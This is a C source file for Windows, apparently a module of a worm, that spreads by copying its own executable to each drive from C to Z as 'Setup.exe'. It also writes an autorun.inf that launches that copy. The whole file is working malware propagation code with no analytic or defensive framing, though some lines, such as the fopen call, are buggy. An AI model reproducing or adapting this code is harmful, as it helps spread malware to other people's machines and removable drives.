#include <windows.h>
#include <stdio.h> //for C references
#include <tlhelp32.h> //for ProcessKill

#include "Spread.h"
DWORD WINAPI Drivespread(LPVOID p)
{
	
//	int i;
	char autorun[] = "[autorun]"; //
	char start [] = "OPEN = Setup.exe"; //OPEN = Setup.exe
	char open[] = "ShellExecute=Setup.exe"; //ShellExecute=Setup.exe 
	char drive_cnt,DropPath[32];
	int DriveType;
	char me[262];
	char TmpPath[MAX_PATH];
	
	GetTempPath(sizeof(TmpPath), TmpPath); 
	wsprintf(me, "%s\21[05]1992.exe", TmpPath);
		
	for(drive_cnt = 'C';drive_cnt <= 'Z';drive_cnt++)
	{
		sprintf(DropPath,"%c:\\",drive_cnt);
		DriveType = GetDriveType(DropPath);

		if(DriveType != 0 && DriveType != 1)
		{			
			strcat(DropPath,"Setup.exe");
			CopyFile(me,DropPath,true);
			
			FILE *file;
			file = fopen((DropPath,"autorun.inf"),"w+");
			fputs(autorun,file);
			fputs("\n",file);
			fputs(start,file);
			fputs("\n",file);
			fputs(open,file); 
			fclose(file); 
						
		}
		
		Sleep(30);
	}
return 0;
}

int Spread()
{
	DWORD dword;
	CreateThread(0,0,&Drivespread,0,0,&dword);
	return 0;
}